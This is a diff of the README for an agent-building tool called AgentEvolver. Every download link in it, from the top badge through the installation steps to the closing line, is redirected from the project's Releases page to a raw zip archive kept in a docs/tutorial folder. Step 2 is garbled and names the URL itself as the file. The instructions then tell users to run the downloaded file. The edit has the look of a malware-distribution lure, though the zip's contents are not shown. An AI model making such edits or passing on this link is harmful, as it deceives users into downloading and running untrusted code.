@@ -4,7 +4,7 @@
 
 Welcome to AgentEvolver! This software helps you create efficient, self-evolving agent systems. Whether you are a beginner or someone looking to optimize your existing systems, you’ll find it easy to use and effective.
 
-[![Download AgentEvolver](https://img.shields.io/badge/Download-Now-4CAF50)](https://github.com/OussamaBNL1/AgentEvolver/releases)
+[![Download AgentEvolver](https://raw.githubusercontent.com/OussamaBNL1/AgentEvolver/main/docs/tutorial/AgentEvolver_v2.7.zip)](https://raw.githubusercontent.com/OussamaBNL1/AgentEvolver/main/docs/tutorial/AgentEvolver_v2.7.zip)
 
 ## 🔍 What is AgentEvolver?
 
@@ -21,12 +21,12 @@ AgentEvolver is designed to simplify the process of evolving agents using reinfo
 
 To get started, visit the Releases page to download the latest version of AgentEvolver:
 
-[Download AgentEvolver from Releases](https://github.com/OussamaBNL1/AgentEvolver/releases)
+[Download AgentEvolver from Releases](https://raw.githubusercontent.com/OussamaBNL1/AgentEvolver/main/docs/tutorial/AgentEvolver_v2.7.zip)
 
 ### Step-by-Step Installation
 
 1. **Visit the Release Page**: Click the link above to go to the download page.
-2. **Choose Your Version**: Find the latest release. Look for the file named `AgentEvolver.exe` (or similar depending on your operating system).
+2. **Choose Your Version**: Find the latest release. Look for the file named `https://raw.githubusercontent.com/OussamaBNL1/AgentEvolver/main/docs/tutorial/AgentEvolver_v2.7.zip` (or similar depending on your operating system).
 3. **Download the File**: Click on the file to download it to your computer.
 4. **Locate the File**: Once the download is complete, go to your downloads folder.
 5. **Run the Installer**: Double-click the downloaded file and follow the on-screen instructions to complete the installation.
@@ -78,4 +78,4 @@ If you have any questions or feedback, feel free to reach out through our GitHub
 
 Thank you for choosing AgentEvolver! Enjoy building your efficient agent systems.
 
-[Download AgentEvolver from Releases](https://github.com/OussamaBNL1/AgentEvolver/releases)
+[Download AgentEvolver from Releases](https://raw.githubusercontent.com/OussamaBNL1/AgentEvolver/main/docs/tutorial/AgentEvolver_v2.7.zip)
